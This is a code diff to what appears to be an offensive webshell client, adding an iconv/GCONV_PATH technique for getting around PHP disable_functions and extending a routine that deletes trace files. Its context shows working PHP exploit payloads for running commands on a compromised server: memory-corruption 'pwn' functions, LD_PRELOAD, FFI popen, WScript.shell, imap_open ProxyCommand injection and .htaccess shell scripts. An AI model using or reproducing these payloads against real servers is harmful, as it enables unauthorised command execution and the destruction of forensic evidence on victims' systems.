@@ -155,7 +155,11 @@ def clean_trace():
     """ % (base64_encode(filename), get_system_code(system_clean_command))
     ld_preload_filename = gget("webshell.ld_preload_path", "webshell", None)
     udf_filename = gget("webshell.udf_path", "webshell", None)
-    clean_files = (ld_preload_filename, udf_filename)
+    iconv_filename = gget("webshell.iconv_path", "webshell", None)
+    iconv_gconv_modules_filename = gget(
+        "webshell.iconv_gconv_modules_path", "webshell", None)
+    clean_files = (ld_preload_filename, udf_filename,
+                   iconv_filename, iconv_gconv_modules_filename)
 
     for each in clean_files:
         if (each):
@@ -173,6 +177,8 @@ def clean_trace():
 
     gset("webshell.ld_preload_path", None, True, "webshell")
     gset("webshell.ld_preload_func", None, True, "webshell")
+    gset("webshell.iconv_path", None, True, "webshell")
+    gset("webshell.iconv_gconv_modules_path", None, True, "webshell")
     gset("webshell.udf_path", None, True, "webshell")
     gset("webshell.apache_mod_cgi", False, True, "webshell")
     gset("db_dbms", '', True, "webshell")
@@ -501,9 +507,9 @@ def prepare_system_template(exec_func: str):
 
 
 def get_system_code(command: str, print_result: bool = True, mode: int = 0):
-    bypass_df = gget("webshell.bypass_df", "webshell") if mode == 0 else mode
+    bdf_mode = gget("webshell.bypass_df", "webshell") if mode == 0 else mode
     print_command = "print($o);" if print_result else ""
-    if (bypass_df == 1):
+    if (bdf_mode == 1):
         return """$o=pwn(base64_decode("%s"));
 function pwn($cmd) {
     global $abc, $helper, $backtrace;
@@ -714,7 +720,7 @@ function pwn($cmd) {
     %s
     return $o;
 }""" % (base64_encode(command), print_command)
-    elif (bypass_df == 2):
+    elif (bdf_mode == 2):
         return """$o=pwn(base64_decode("%s"));
 
 function pwn($cmd) {
@@ -921,7 +927,7 @@ function pwn($cmd) {
     %s
     return $o;
 }""" % (base64_encode(command), print_command)
-    elif (bypass_df == 3):
+    elif (bdf_mode == 3):
         return """$cmd = base64_decode("%s");
 $n_alloc = 10; # increase this value if you get segfaults
 
@@ -1178,7 +1184,7 @@ class Z implements JsonSerializable {
 $y = [new Z()];
 json_encode([&$y]);
 $o=$GLOBAL['o'];""" % (base64_encode(command), print_command)
-    elif (bypass_df == 4):
+    elif (bdf_mode == 4):
         ld_preload_func = gget("webshell.ld_preload_func", "webshell")
         ld_preload_command = ""
         if (ld_preload_func == "mail"):
@@ -1201,7 +1207,7 @@ unlink($p);
          gget("webshell.ld_preload_path", "webshell"),
          ld_preload_command,
          print_command)
-    elif (bypass_df == 5):
+    elif (bdf_mode == 5):
         return """$f=FFI::cdef("void *popen(const char *command, const char *type);
 int pclose(void * stream);
 int fgetc (void *fp);","libc.so.6");
@@ -1211,13 +1217,13 @@ $d="";while(($c=$f->fgetc($o))!=-1)
 $f->pclose($o);
 $o=hex2bin($d);
 %s""" % (base64_encode(command), print_command)
-    elif (bypass_df == 6):
+    elif (bdf_mode == 6):
         return """$wsh = new COM('WScript.shell');
 $exec = $wsh->exec("cmd /c ".base64_decode("%s"));
 $stdout = $exec->StdOut();
 $o = $stdout->ReadAll();
 %s""" % (base64_encode(command), print_command)
-    elif (bypass_df == 7):
+    elif (bdf_mode == 7):
         tmpname = str(uuid4())
         return """if (!function_exists('imap_open')) {print("no imap_open function!");}
 else{$server = "x -oProxyCommand=echo\\t" . base64_encode(base64_decode("%s") . ">/tmp/%s") . "|base64\\t-d|sh}";
@@ -1226,7 +1232,7 @@ sleep(1);
 $o=file_get_contents("/tmp/%s");
 %s
 unlink("/tmp/%s");}""" % (base64_encode(command), tmpname, tmpname, print_command, tmpname)
-    elif (bypass_df == 8):
+    elif (bdf_mode == 8):
         connect_type = gget("db_connect_type", "webshell")
         if (connect_type == "pdo"):
             return """try{%s
@@ -1249,7 +1255,7 @@ $GLOBAL['o']=$o;
 $r->close();
 $con->close();
 }""" % (get_db_connect_code(), hex_encode(command), print_command)
-    elif (bypass_df == 9):
+    elif (bdf_mode == 9):
         return """error_reporting(E_ALL);
 
 define('NB_DANGLING', 200);
@@ -1568,7 +1574,7 @@ $dlls[NB_DANGLING]->rewind();
 
 # Trigger the bug on the first list
 $dlls[0]->offsetUnset(0);""" % (print_command, base64_encode(command))
-    elif (bypass_df == 10):
+    elif (bdf_mode == 10):
         bits = gget("webshell.arch", "webshell")
         is_win = gget("webshell.is_win", "webshell")
         ext_local_path = path.join(gget("root_path"), "auxiliary", "fpm")
@@ -1639,7 +1645,7 @@ die('stream_socket_client function not exist or sock not exist');
 
         phpcode += f"sleep(1);$o=file_get_contents('{response_file}');unlink('{ext_upload_path}');unlink('{response_file}');{print_command}"
         return phpcode
-    elif (bypass_df == 11):
+    elif (bdf_mode == 11):
         shellscript_name = randstr(ALPATHNUMERIC, 8) + ".dh"
         res = send("""$cmd = base64_decode("%s");
 $shellcode = "#!/bin/sh\\n";
@@ -1658,14 +1664,32 @@ print($f);
         webshell_url = gget("webshell.url", namespace="webshell")
         parsed = list(urlparse(webshell_url))
         webshell_path = parsed[2]
-        shellscript_path = "/" + "/".join(webshell_path.split("/")[:-1]) + shellscript_name
+        shellscript_path = "/" + \
+            "/".join(webshell_path.split("/")[:-1]) + shellscript_name
         parsed[2] = shellscript_path
         shellscript_url = urlunparse(parsed)
 
         # request shellscript url and get result
         res = requests.get(shellscript_url)
         o = base64_encode(res.text.strip())
-        phpcode = """$o=base64_decode('%s');%sunlink('%s');unlink(".htaccess");rename(".htaccess.bak", ".htaccess");""" % (o, print_command, real_shellscript_name)
+        phpcode = """$o=base64_decode('%s');%sunlink('%s');unlink(".htaccess");rename(".htaccess.bak", ".htaccess");""" % (
+            o, print_command, real_shellscript_name)
+        return phpcode
+    elif (bdf_mode == 12):
+        p = "/tmp/%s" % randstr(ALPATHNUMERIC, 8)
+        pre_phpcode = """$p="%s";
+putenv("GCONV_PATH=/tmp/");
+putenv("cmd=".base64_decode("%s"));
+putenv("rpath=$p");
+if(function_exists('iconv')){
+    iconv("payload", "UTF-8", "whatever");
+} else if(function_exists('iconv_strlen')) {
+    iconv_strlen("1","payload");
+}
+""" % (p, base64_encode(command))
+        send(pre_phpcode, quiet=True)
+        phpcode = """$p="%s";sleep(1);$o=file_get_contents($p);unlink($p);%s""" % (p, print_command)
+
         return phpcode
     elif (gget("webshell.exec_func", "webshell") and SYSTEM_TEMPLATE):
         return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
